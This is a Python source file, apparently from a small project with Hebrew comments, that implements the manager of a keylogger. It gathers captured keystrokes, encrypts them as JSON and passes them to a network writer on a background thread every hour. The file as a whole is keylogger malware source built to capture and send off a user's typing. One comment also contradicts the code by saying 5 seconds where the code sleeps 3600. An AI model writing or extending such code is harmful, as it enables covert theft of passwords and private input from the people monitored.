import json
import threading
import time

from IWrite import IWrite
from KeyLoggerService import KeyLoggerService
from Encryptor import Encryptor
from NetworkWriter import NetworkWrite


class KeyLoggerManager:
    def __init__(self, keylogger_service: KeyLoggerService, writer: IWrite) -> None:
        self.keylogger_service = keylogger_service
        self.writer = writer
        self.encrypt = Encryptor()
        self.stop_event = threading.Event()  # מאפשר שליטה על עצירה
        self.thread = threading.Thread(target=self.run, daemon=True)  # Thread ייעודי

    def data_to_buffer(self, data) -> bytes:
        """המרת המידע למבנה הניתן להצפנה"""
        print("data_to_buffer")
        return json.dumps(data).encode("utf-8")  # מחזיר כ- bytes ישירות

    def run(self):
        """מבצע איסוף נתונים, הצפנה וכתיבה כל שעה"""
        print("run started")
        while not self.stop_event.is_set():
            data = self.keylogger_service.get_logged_keys()
            buffer = self.data_to_buffer(data)
            encrypt_buffer = self.encrypt.encryptor(buffer)
            # self.write(encrypt_buffer)  # כתיבה מיידית
            time.sleep(3600)  # מחכה 5 שניות לפני איסוף הנתונים הבא

    def write(self, encrypt_buffer):
        """כתיבת הנתונים המוצפנים למחסן הנתונים"""
        if encrypt_buffer:
            self.writer.Write(encrypt_buffer)
            self.keylogger_service.clear_logged_keys()

    def start(self):
        """הפעלת ה-Thread של ה-Keylogger"""
        self.thread.start()

    def stop(self):
        """מאפשר לעצור את הפעולה המתוזמנת בצורה נקייה"""
        self.stop_event.set()
        self.thread.join()  # מחכה שה-thread ייסגר


if __name__ == '__main__':
    k_service = KeyLoggerService()
    writer = NetworkWrite()
    k_manager = KeyLoggerManager(k_service, writer)

    try:
        k_manager.start()  # מפעיל את ה-Keylogger ברקע
        while True:
            time.sleep(1)  # משאיר את התוכנית פעילה
    except KeyboardInterrupt:
        print("Stopping KeyLogger...")
        k_manager.stop()  # עוצר את ה-Keylogger בצורה מסודרת

